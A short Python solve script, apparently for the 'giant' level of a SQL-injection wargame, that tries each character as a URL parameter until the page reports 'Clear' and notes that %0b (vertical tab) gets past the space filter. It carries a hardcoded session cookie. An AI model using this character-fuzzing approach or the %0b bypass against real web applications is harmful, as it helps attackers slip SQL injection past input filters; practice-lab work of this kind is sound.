#!/usr/local/bin/python3

import urllib.request
from urllib.parse import quote

key = ""
for i in range(1, 127):
    url = "http://los.eagle-jump.org/giant_9e5c61fc7f0711c680a4bf2553ee60bb.php?shit="
    data = "{}".format(chr(i))
    print(i)
    data = quote(data)
    re = urllib.request.Request(url + data)
    re.add_header(
        "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
    re.add_header("Cookie", "PHPSESSID=pdah5igtkcp024tlbfueevv8b0")
    re.add_header(
        "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
    req = urllib.request.urlopen(re)

    if str(req.read()).find("Clear") != -1:
        print (i)
        break

# 11 -> %0b
